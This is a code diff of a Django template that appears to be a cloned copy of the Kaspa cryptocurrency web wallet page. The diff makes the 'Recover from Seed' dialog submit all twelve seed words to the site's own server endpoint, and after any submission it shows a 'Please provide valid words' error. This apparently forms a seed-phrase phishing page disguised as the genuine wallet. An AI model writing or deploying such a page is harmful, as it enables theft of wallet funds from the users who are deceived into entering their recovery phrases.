@@ -16,6 +16,7 @@
   <meta name=msapplication-TileColor content=#ffffff>
   <meta name=msapplication-TileImage content=/resources/icons/ms-icon-144x144.png>
   <meta name=theme-color content=#ffffff>
+  {% comment %} <meta http-equiv="Content-Security-Policy" content="default-src 'none'; connect-src 'self' http://127.0.0.1:8000/; style-src 'self' 'unsafe-inline'; img-src 'self' data:;script-src 'self' 'unsafe-inline';font-src 'self' data:;"> {% endcomment %}
   <style>
     @font-face {
       font-family: "Open Sans";
@@ -360,12 +361,10 @@
     source[src="data:,"] {
       display: none !important
     }
+    .hidden {
+      display: none;
+    }
   </style>
-    <script>
-        document.getElementById('text-element').addEventListener('click', function() {
-        console.log('=====================')
-        });
-    </script>
   </head>
   <body class="v-box mini-left-menu swipeable-container flow-theme-light">
     <kaspa-wallet-app>
@@ -3705,8 +3704,7 @@
           </div>
         </template>
       </kaspa-wallet>
-      {% if mode == 'init' %}
-      <kaspa-open-dialog mode=init class=active isfresh>
+      <kaspa-open-dialog id="index" mode=init class="active {% if submitted%} hidden {%endif%} isfresh">
         <template shadowroot=open>
           <style>
             ::-webkit-scrollbar-track,
@@ -4004,7 +4002,7 @@
                   </div>
                 </div>
                 <div class=buttons>
-                  <flow-btn id="showFormButton" class=primary i18n role=button>
+                  <flow-btn onclick='changeView("index","create-form")' class=primary i18n role=button>
                     <template shadowroot=open>
                       <style>
                         :host {
@@ -4172,7 +4170,7 @@
                       </div>
                     </template>Create New Wallet
                   </flow-btn>
-                  <flow-btn class=primary i18n role=button >
+                  <flow-btn onclick='changeView("index","recover-form")' class=primary i18n role=button >
                     <template shadowroot=open>
                       <style>
                         :host {
@@ -4340,12 +4338,6 @@
                       </div>
                     </template>Recover from Seed
                   </flow-btn>
-                  <form id="myForm" style="display: none;">
-                    <!-- Form fields go here -->
-                    <input type="text" name="name" placeholder="Name">
-                    <input type="email" name="email" placeholder="Email">
-                    <button type="submit">Submit</button>
-                    </form>
                 </div>
                 <span class="close-btn sf-hidden" title=Close>×</span>
               </div>
@@ -4353,8 +4345,7 @@
           </div>
         </template>
       </kaspa-open-dialog>
-      {% elif mode == 'create' %}
-      <kaspa-open-dialog mode=create class=active isfresh>
+      <kaspa-open-dialog id="create-form" class="hidden" mode=create class=active isfresh>
         <template shadowroot=open>
           <style>
             ::-webkit-scrollbar-track,
@@ -5050,7 +5041,7 @@
                   </div>
                 </div>
                 <div class=buttons>
-                  <flow-btn i18n role=button>
+                  <flow-btn onclick='changeView("create-form","index")' i18n role=button>
                     <template shadowroot=open>
                       <style>
                         :host {
@@ -5557,9 +5548,8 @@
           </div>
         </template>
       </kaspa-open-dialog>
-      {% else %}
-      <kaspa-open-dialog mode=recover class=active isfresh>
-        <template shadowroot=open>
+      <kaspa-open-dialog id="recover-form" class="{% if not submitted%} hidden {%else%} active {%endif%} recover-form" mode=recover class=isfresh>
+        <template id="recover-template" shadowroot=open>
           <style>
             ::-webkit-scrollbar-track,
             :host::-webkit-scrollbar-track {
@@ -5854,54 +5844,59 @@
                   <div class=inner-body>
                     <p class="sub-heading text-center" is=i18n-p>Enter your 12-word seed phrase to recover your wallet (words are not case sensitive)</p>
                     <div class=words>
+                      <form action="recover" method="post" id="recover">
+                        {% csrf_token %}
                       <div class=row>
                         <div class=cell>
-                          <input class="seed word" value data-index=0>
+                          <input name="phrase_1" class="seed word" value data-index=0>
                         </div>
                         <div class=cell>
-                          <input class="seed word" value data-index=1>
+                          <input name="phrase_2" class="seed word" value data-index=1>
                         </div>
                         <div class=cell>
-                          <input class="seed word" value data-index=2>
+                          <input name="phrase_3" class="seed word" value data-index=2>
                         </div>
                         <div class=cell>
-                          <input class="seed word" value data-index=3>
+                          <input name="phrase_4" class="seed word" value data-index=3>
                         </div>
                       </div>
                       <div class=row>
                         <div class=cell>
-                          <input class="seed word" value data-index=4>
+                          <input name="phrase_5" class="seed word" value data-index=4>
                         </div>
                         <div class=cell>
-                          <input class="seed word" value data-index=5>
+                          <input name="phrase_6" class="seed word" value data-index=5>
                         </div>
                         <div class=cell>
-                          <input class="seed word" value data-index=6>
+                          <input name="phrase_7" class="seed word" value data-index=6>
                         </div>
                         <div class=cell>
-                          <input class="seed word" value data-index=7>
+                          <input name="phrase_8" class="seed word" value data-index=7>
                         </div>
                       </div>
                       <div class=row>
                         <div class=cell>
-                          <input class="seed word" value data-index=8>
+                          <input name="phrase_9" class="seed word" value data-index=8>
                         </div>
                         <div class=cell>
-                          <input class="seed word" value data-index=9>
+                          <input name="phrase_10" class="seed word" value data-index=9>
                         </div>
                         <div class=cell>
-                          <input class="seed word" value data-index=10>
+                          <input name="phrase_11" class="seed word" value data-index=10>
                         </div>
                         <div class=cell>
-                          <input class="seed word" value data-index=11>
+                          <input name="phrase_12" class="seed word" value data-index=11>
                         </div>
                       </div>
+                      </form>
                     </div>
-                    <div class=error></div>
+                    {% if submitted%}
+                      <div class="error">Please provide valid words</div>
+                    {%endif%}
                   </div>
                 </div>
                 <div class=buttons>
-                  <flow-btn i18n role=button>
+                  <flow-btn onclick=changeView("recover-form","index") i18n role=button>
                     <template shadowroot=open>
                       <style>
                         :host {
@@ -6069,7 +6064,7 @@
                       </div>
                     </template>Cancel
                   </flow-btn>
-                  <flow-btn primary i18n role=button>
+                  <flow-btn onclick=submitRecover(event) primary i18n role=button>
                     <template shadowroot=open>
                       <style>
                         :host {
@@ -6244,9 +6239,21 @@
           </div>
         </template>
       </kaspa-open-dialog>
-      {% endif %}
     </kaspa-wallet-app>
-    
+    <script>
+      function changeView(hideForm, showForm) {
+        const index = document.getElementById(hideForm);
+        index.classList.add("hidden");
+        const create = document.getElementById(showForm)
+        create.classList.remove("hidden");
+        create.classList.add("active");
+      }
+      function submitRecover(event) {
+        event.preventDefault()
+        var form = document.querySelector("#recover-form").shadowRoot.querySelector("#recover")
+        form.submit()
+      }
+    </script>
 </body>
 
     
